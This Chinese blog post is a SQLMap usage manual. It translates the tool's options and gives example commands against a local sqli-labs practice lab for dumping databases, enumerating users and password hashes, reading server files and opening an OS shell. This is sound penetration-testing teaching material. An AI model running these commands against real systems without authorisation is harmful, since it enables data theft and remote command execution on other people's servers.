---
title: SQLMap 使用手册
toc: true
categories: Tech Blog
thumbnail: images/Tech%20Blog/sqlmap_cover.jpg
abbrlink: 5033348c
date: 2023-07-24 00:00:00
updated: 2023-09-29 00:00:00
---

## 简介

[SQLMap](https://sqlmap.org/) 是功能强大的自动化 SQL 注入开源工具，能够检测动态页面中的 get/post 参数, cookie, http 头, 能查看数据，访问文件系统甚至执行系统命令，支持对 MySQL, Oracle, PostgreSQL, MSSQL, SQLite 等数据进行布尔盲注，时间盲注，联表注入与堆叠注入等攻击。
<!--more-->
SQLMap 的特点有

- 全面支持 MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、Informix、MariaDB、MemSQL、TiDB、CockroachDB、HSQLDB、H2、MonetDB、Apache Derby、Amazon Redshift、Vertica、Mckoi、Presto、Altibase、MimerSQL、CrateDB、Greenplum、Drizzle、Apache Ignite、Cubrid、InterSystems Cache、IRIS、eXtremeDB、FrontBase、Raima Database Manager、YugabyteDB、ClickHouse 和 Virtuoso 数据库管理系统。
- 全面支持六种 SQL 注入技术：基于布尔的盲、基于时间的盲、基于错误、基于 UNION 查询、堆叠查询和带外查询。
- 通过提供 DBMS 凭证、IP 地址、端口和数据库名称，支持直接连接到数据库，而无需通过 SQL 注入。
- 支持枚举用户、密码散列、特权、角色、数据库、表和列。
- 自动识别密码哈希格式，并支持使用基于字典的攻击破解它们。
- 支持完全转储数据库表，一系列条目或特定列，根据用户的选择。用户还可以选择只转储每列条目中的字符范围。
- 支持搜索特定的数据库名称、所有数据库中的特定表或所有数据库表中的特定列。例如，这对于标识包含自定义应用程序凭据的表非常有用，其中相关列名包含 name 和 pass 等字符串。
- 当数据库软件为 MySQL、PostgreSQL 或 Microsoft SQL Server 时，支持从数据库服务器底层文件系统下载和上传任何文件。
- 当数据库软件为 MySQL、PostgreSQL 或 Microsoft SQL Server 时，支持在数据库服务器底层操作系统上执行任意命令并检索其标准输出。
- 支持在攻击机器和数据库服务器底层操作系统之间建立带外有状态 TCP 连接。根据用户的选择，该通道可以是交互式命令提示符、Meterpreter 会话或图形用户界面（VNC）会话。
- 通过 Metasploit 的 Meterpreter getsystem 命令支持数据库进程的用户权限提升。

## 目录介绍

- -doc 目录：保护 sqlmap 的简要说明，具体使用说明，作者信息等。
- extra 目录：包含 sqlmap 的额外功能，如发出声响、允许 cmd、安全执行等。
- lib 目录：sqlmap 核心目录。
- plugins 目录：包含了 sqlmap 目前支持的 13 种数据库信息和数据库通用事项。
- procs 目录：包含了 mssql、mysql、oracle、postgresql 的触发程序。
- shell 目录：包含了注入成功后的 9 种 shell 远程命令执行。
- tamper 目录：包含了 waf 绕过脚本。
- thirdparty 目录：包含了第三方插件，例如优化，保持连接，颜色。
- txt 目录：包含了表名字典，列名字典，UA 字典等。
- udf 目录：存放攻击载荷。
- waf 目录：存放 waf 特征判断脚本。
- xml 目录：存放多种数据库注入检测的 payload 等信息

## 参数列表

### 常用参数

![preview](images/Tech%20Blog/SQLMAP.png)
`sqlmap -h` 获取常用参数说明
`sqlmap -hh` 获取所有参数与说明

### 一般选项参数

通过一般选项参数设置 SQLMap 的一般工作方式

- -s SESSIONFILE      保存和恢复检索会话文件的所有数据
- -t TRAFFICFILE      记录所有 HTTP 流量到一个文本文件中
- --batch             从不询问用户输入，使用所有默认配置。
- --binary-fields =..  结果字段具有二进制值(e.g."digest")
- --charset = CHARSET   强制字符编码
- --crawl = CRAWLDEPTH  从目标 URL 爬行网站
- --crawl-exclude =..  正则表达式从爬行页中排除
- --csv-del = CSVDEL    限定使用 CSV 输出 (default ",")
- --dump-format = DU..  转储数据格式(CSV(default), HTML or SQLITE)
- --eta               显示每个输出的预计到达时间
- --flush-session     刷新当前目标的会话文件
- --forms             解析和测试目标 URL 表单
- --fresh-queries     忽略在会话文件中存储的查询结果
- --hex               使用 DBMS Hex 函数数据检索
- --output-dir = OUT..  自定义输出目录路径
- --parse-errors      解析和显示响应数据库错误信息
- --save = SAVECONFIG   保存选项到 INI 配置文件
- --scope = SCOPE       从提供的代理日志中使用正则表达式过滤目标
- --test-filter = TE..  选择测试的有效载荷和/或标题(e.g. ROW)
- --test-skip = TEST..  跳过试验载荷和/或标题(e.g.BENCHMARK)
- --update            更新 sqlmap
- -h,--help           显示基本帮助信息并退出
- -hh                 显示高级帮助信息并退出
- --version           显示程序版本信息并退出
- -vVERBOSE           信息级别: 0-6 （缺省 1），其值具体含义：“0”只显示 python 错误以及严重的信息；1 同时显示基本信息和警告信息（默认）；“2”同时显示 debug 信息；“3”同时显示注入的 payload；“4”同时显示 HTTP 请求；“5”同时显示 HTTP 响应头；“6”同时显示 HTTP 响应页面；如果想看到 sqlmap 发送的测试 payload 最好的等级就是 3。

### 目标参数

通过目标参数提供不少于一个确定目标

- -d DIRECT           直接连接数据库的连接字符串
- -u URL, --url = URL   目标 URL (e.g."http://www.site.com/vuln.php?id = 1")，使用-u 或者--url
- -l LOGFILE          从 Burp 或者 WebScarab 代理日志文件中分析目标
- -x SITEMAPURL       从远程网站地图（sitemap.xml）文件来解析目标
- -m BULKFILE         将目标地址保存在文件中，一行为一个 URL 地址进行批量检测。
- -r REQUESTFILE      从文件加载 HTTP 请求，sqlmap 可以从一个文本文件中获取 HTTP 请求，这样就可以跳过设置一些其他参数（比如 cookie，POST 数据，等等），请求是 HTTPS 的时需要配合这个--force-ssl 参数来使用，或者可以在 Host 头后门加上: 443
- -g GOOGLEDORK       从谷歌中加载结果目标 URL（只获取前 100 个结果，需要挂代理）
- -c CONFIGFILE       从配置 ini 文件中加载选项

### 请求参数

通过请求参数指定如何连接到目标 URL

- --method = METHOD     强制使用给定的 HTTP 方法（例如 put）
- --data = DATA         通过 POST 发送数据参数，sqlmap 会像检测 GET 参数一样检测 POST 的参数。--data = "id = 1" -f --banner --dbs --users
- --param-del = PARA..  当 GET 或 POST 的数据需要用其他字符分割测试参数的时候需要用到此参数。
- --cookie = COOKIE     HTTP Cookieheader 值
- --cookie-del = COO..  用来分隔 cookie 的字符串值
- --load-cookies = L..  Filecontaining cookies in Netscape/wget format
- --drop-set-cookie   IgnoreSet-Cookie header from response
- --random-agent      使用 random-agent 作为 HTTP User-Agent 头值
- --host = HOST         HTTP Hostheader value
- --referer = REFERER   sqlmap 可以在请求中伪造 HTTP 中的 referer，当--level 参数设定为 3 或者 3 以上的时候会尝试对 referer 注入
- -H HEADER, --hea..  额外的 http 头(e.g."X-Forwarded-For: 127.0.0.1")
- --headers = HEADERS   可以通过--headers 参数来增加额外的 http 头(e.g."Accept-Language: fr\nETag: 123")
- --auth-type = AUTH..  HTTP 的认证类型 (Basic, Digest, NTLM or PKI)
- --auth-cred = AUTH..  HTTP 认证凭证(name: password)
- --auth-file = AUTH..  HTTP 认证 PEM 证书/私钥文件；当 Web 服务器需要客户端证书进行身份验证时，需要提供两个文件: key_file，cert_file, key_file 是格式为 PEM 文件，包含着你的私钥，cert_file 是格式为 PEM 的连接文件。
- --ignore-401        Ignore HTTPError 401 (Unauthorized)忽略 HTTP 401 错误（未授权的）
- --ignore-proxy      忽略系统的默认代理设置
- --ignore-redirects  忽略重定向的尝试
- --ignore-timeouts   忽略连接超时
- --proxy = PROXY       使用代理服务器连接到目标 URL
- --proxy-cred = PRO..  代理认证凭证(name: password)
- --proxy-file = PRO..  从文件加载代理列表
- --tor               使用 Tor 匿名网络
- --tor-port = TORPORT  设置 Tor 代理端口
- --tor-type = TORTYPE  设置 Tor 代理类型 (HTTP, SOCKS4 or SOCKS5 (缺省))
- --check-tor         检查 Tor 的是否正确使用
- --delay = DELAY       可以设定两个 HTTP(S)请求间的延迟，设定为 0.5 的时候是半秒，默认是没有延迟的。
- --timeout = TIMEOUT   可以设定一个 HTTP(S)请求超过多久判定为超时，10 表示 10 秒，默认是 30 秒。
- --retries = RETRIES   当 HTTP(S)超时时，可以设定重新尝试连接次数，默认是 3 次。
- --randomize = RPARAM  可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样
- --safe-url = SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下
- --safe-post = SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。
- --safe-req = SAFER..  从文件中加载安全 HTTP 请求
- --safe-freq = SAFE..  测试一个给定安全网址的两个访问请求
- --skip-urlencode    跳过 URL 的有效载荷数据编码
- --csrf-token = CSR..  Parameter usedto hold anti-CSRF token 参数用来保存反 CSRF 令牌
- --csrf-url = CSRFURL  URL 地址访问提取 anti-CSRF 令牌
- --force-ssl         强制使用 SSL/HTTPS
- --hpp               使用 HTTP 参数污染的方法
- --eval = EVALCODE     在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval 参数在每次请求时根据所写 python 代码做完修改后请求。(e.g "import hashlib; id2 = hashlib.md5(id).hexdigest()")
`sqlmap.py -u"http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b"--eval="import hashlib;hash=hashlib.md5(id).hexdigest()"`

### 优化参数

通过优化参数的设置优化 sqlmap 性能

- -o                  打开所有的优化开关
- --predict-output    预测普通查询输出
- --keep-alive        使用持久 HTTP（S）连接
- --null-connection   获取页面长度
- --threads = THREADS   当前 http(s)最大请求数 (默认 1)

### 注入参数

通过注入参数指定要测试的参数并提供注入有效载荷和可选的篡改脚本

- -p TESTPARAMETER    可测试的参数
- --skip = SKIP         跳过对给定参数的测试
- --skip-static       跳过测试不显示为动态的参数
- --param-exclude =..  使用正则表达式排除参数进行测试（e.g. "ses"）
- --dbms = DBMS         强制后端的 DBMS 为此值
- --dbms-cred = DBMS..  DBMS 认证凭证(user: password)
- --os = OS             强制后端的 DBMS 操作系统为这个值
- --invalid-bignum    使用大数字使值无效
- --invalid-logical   使用逻辑操作使值无效
- --invalid-string    使用随机字符串使值无效
- --no-cast           关闭有效载荷铸造机制
- --no-escape         关闭字符串逃逸机制
- --prefix = PREFIX     注入 payload 字符串前缀
- --suffix = SUFFIX     注入 payload 字符串后缀
- --tamper = TAMPER     使用给定的脚本篡改注入数据

### 检测参数

通过检测参数指定在盲注的时候如何解析和比较 HTTP 响应页面的内容

- --level = LEVEL       执行测试的等级（1-5，默认为 1）
- --risk = RISK         执行测试的风险（0-3，默认为 1）
- --string = STRING     查询时有效时在页面匹配字符串
- --not-string = NOT..  当查询求值为无效时匹配的字符串
- --regexp = REGEXP     查询时有效时在页面匹配正则表达式
- --code = CODE         当查询求值为 True 时匹配的 HTTP 代码
- --text-only         仅基于在文本内容比较网页
- --titles            仅根据他们的标题进行比较

### 技巧参数

通过技巧参数调整 SQL 注入的测试方式

- --technique = TECH    SQL 注入技术测试（默认 BEUST）
  - B    布尔盲注
  - E    报错盲注
  - U    联表注入
  - S    堆叠注入
  - T    时间盲注
- --time-sec = TIMESEC  DBMS 响应的延迟时间（默认为 5 秒）
- --union-cols = UCOLS  定列范围用于测试 UNION 查询注入
- --union-char = UCHAR  暴力猜测列的字符数
- --union-from = UFROM  SQL 注入 UNION 查询使用的格式
- --dns-domain = DNS..  DNS 泄露攻击使用的域名
- --second-order = S..  URL 搜索产生的结果页面

### 指纹参数

通过指纹参数让 SQLMap 扫描时执行广泛的 DBMS 版本指纹检查

- -f, --fingerprint   执行广泛的 DBMS 版本指纹检查

### 枚举参数

通过枚举参数列举后端 DBMS 的库，表，字段的结构与数据，以及运行自定义 SQL 语句

- -a, --all           获取所有信息
- -b, --banner        获取数据库管理系统的标识
- --current-user      获取数据库管理系统当前用户
- --current-db        获取数据库管理系统当前数据库
- --hostname          获取数据库服务器的主机名称
- --is-dba            检测 DBMS 当前用户是否 DBA
- --users             枚举数据库管理系统用户
- --passwords         枚举数据库管理系统用户密码哈希
- --privileges        枚举数据库管理系统用户的权限
- --roles             枚举数据库管理系统用户的角色
- --dbs               枚举数据库管理系统数据库
- --tables            枚举的 DBMS 数据库中的表
- --columns           枚举 DBMS 数据库表列
- --schema            枚举数据库架构
- --count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url - --count -D testdb
- --dump              转储数据库表项
- --dump-all          转储数据库所有表项
- --search            搜索列（S），表（S）和/或数据库名称（S）
- --comments          获取 DBMS 注释
- -D DB               要进行枚举的指定数据库名
- -T TBL              DBMS 数据库表枚举
- -C COL              DBMS 数据库表列枚举
- -X EXCLUDECOL       DBMS 数据库表不进行枚举
- -U USER             用来进行枚举的数据库用户
- --exclude-sysdbs    枚举表时排除系统数据库
- --pivot-column = P..  Pivot columnname
- --where = DUMPWHERE   Use WHEREcondition while table dumping
- --start = LIMITSTART  获取第一个查询输出数据位置
- --stop = LIMITSTOP    获取最后查询的输出数据
- --first = FIRSTCHAR   第一个查询输出字的字符获取
- --last = LASTCHAR     最后查询的输出字字符获取
- --sql-query = QUERY   要执行的 SQL 语句
- --sql-shell         提示交互式 SQL 的 shell
- --sql-file = SQLFILE  要执行的 SQL 文件

### 暴力参数

通过暴力参数让 SQLMap 执行暴力检查

- --common-tables     检查存在共同表
- --common-columns    检查存在共同列

### 自定义函数参数

通过自定义函数参数为 SQLMap 创建用户自定义函数

- --udf-inject        注入用户自定义函数
- --shared-lib = SHLIB  共享库的本地路径

### 特殊操作选项参数

通过特殊操作选项参数令 SQLMap 执行远程访问等特殊操作

#### 访问文件系统

通过这些参数可以访问后端文件系统

- --file-read = RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005 中读取二进制文件 example.exe: `sqlmap.py -u"http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther"--file-read "C:/example.exe" -v 1`
- --file-write = WFILE  编辑后端的数据库管理系统文件系统上的本地文件
- --file-dest = DFILE   后端的数据库管理系统写入文件的绝对路径

#### 访问操作系统

通过这些参数访问后端操作系统

- --os-cmd = OSCMD      执行操作系统命令（OSCMD）
- --os-shell          交互式的操作系统的 shell
- --os-pwn            获取一个 OOB shell，meterpreter 或 VNC
- --os-smbrelay       一键获取一个 OOBshell，meterpreter 或 VNC
- --os-bof            存储过程缓冲区溢出利用
- --priv-esc          数据库进程用户权限提升
- --msf-path = MSFPATH  MetasploitFramework 本地的安装路径
- --tmp-path = TMPPATH  远程临时文件目录的绝对路径

#### 访问 Windows 注册表

通过这些参数访问后端 Windows 系统的注册表

- --reg-read          读一个 Windows 注册表项值
- --reg-add           写一个 Windows 注册表项值数据
- --reg-del           删除 Windows 注册表键值
- --reg-key = REGKEY    Windows 注册表键
- --reg-value = REGVAL  Windows 注册表项值
- --reg-data = REGDATA  Windows 注册表键值数据
- --reg-type = REGTYPE  Windows 注册表项值类型

### 其他参数

- -z MNEMONICS        使用短记忆法 (e.g."flu, bat, ban, tec = EU")
- --alert = ALERT       发现 SQL 注入时，运行主机操作系统命令
- --answers = ANSWERS   当希望 sqlmap 提出输入时，自动输入自己想要的答案(e.g. "quit = N, follow = N")，例如：`sqlmap.py -u"http://192.168.22.128/get_int.php?id=1"--technique=E--answers="extending=N"    --batch`
- --beep              发现 sql 注入时，发出蜂鸣声。
- --cleanup           清除 sqlmap 注入时在 DBMS 中产生的 udf 与表。
- --dependencies      Check formissing (non-core) sqlmap dependencies
- --disable-coloring  默认彩色输出，禁掉彩色输出。
- --gpage = GOOGLEPAGE  使用前 100 个 URL 地址作为注入测试，结合此选项，可以指定页面的 URL 测试
- --identify-waf      进行 WAF/IPS/IDS 保护测试，目前大约支持 30 种产品的识别
- --mobile            有时服务端只接收移动端的访问，此时可以设定一个手机的 User-Agent 来模仿手机登陆。
- --offline           Work inoffline mode (only use session data)
- --purge-output      从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。
- --skip-waf          跳过 WAF／IPS / IDS 启发式检测保护
- --smart             进行积极的启发式测试，快速判断为注入的报错点进行注入
- --sqlmap-shell      互动提示一个 sqlmapshell
- --tmp-dir = TMPDIR    用于存储临时文件的本地目录
- --web-root = WEBROOT  Web 服务器的文档根目录(e.g."/var/www")
- --wizard            新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入

## 攻击流程

![preview](images/Tech%20Blog/SQLMAP_WORK.png)
![preview](images/Tech%20Blog/SQLMAP_WORK@.jpg)

## 常见用法

### 对目标 url 进行 SQL 注入 (GET)

`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1"`

### 对目标 url 进行 SQL 注入 (POST)

`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1"  --data="id=1"`

### 对目标 url 进行 cookie 注入

`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1"  --cookie="id=1" --level=2 (大于等于二即可)`

### 对目标 url 进行 User-Agent 注入

`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1"  --level=3(大于等于三即可)`

### 利用抓包获取的报文进行注入

`sqlmap -r ./httprequest.txt`

### 脱库

`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1" -a`

### 爆用户

`sqlmap -u 'http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1' --users`
`sqlmap -u 'http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1' --current-user`

### 爆用户密码

`sqlmap -u 'http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1' --passwords`

### 爆用户权限

`sqlmap -u 'http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1' --privileges`

### 爆主机名

`sqlmap -u 'http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1' --hostname`

### 爆库

`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1" --dbs  --batch`
`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1" --current-db  --batch`

### 爆表

`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1" -D DATABASENAME --tables --batch`

### 爆列

`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1" -D DATABASENAME -T TABLENAME --columns   --batch`

### 爆字段类型

`sqlmap -u 'http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1' -D DATABASENAME --schema`

### 爆字段值

`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1" -D DATABASENAME -T TABLENAME -C COLUMNNAME     --dump  --batch`

### 获取 Shell

`sqlmap -u "http:/localhost/sqli-labs-master/sqli-labs-master/Less-1/?id=1"  --os-shell`

## Reference

[https://www.freebuf.com/sectool/321598.html](https://www.freebuf.com/sectool/321598.html)
[https://www.freebuf.com/sectool/164608.html](https://www.freebuf.com/sectool/164608.html)
[https://www.cnblogs.com/cscshi/p/15705030.html](https://www.cnblogs.com/cscshi/p/15705030.html)
[https://www.anquanke.com/post/id/160636](https://www.anquanke.com/post/id/160636)
[https://zhuanlan.zhihu.com/p/377428620](https://zhuanlan.zhihu.com/p/377428620)
[https://zhuanlan.zhihu.com/p/145483801](https://zhuanlan.zhihu.com/p/145483801)
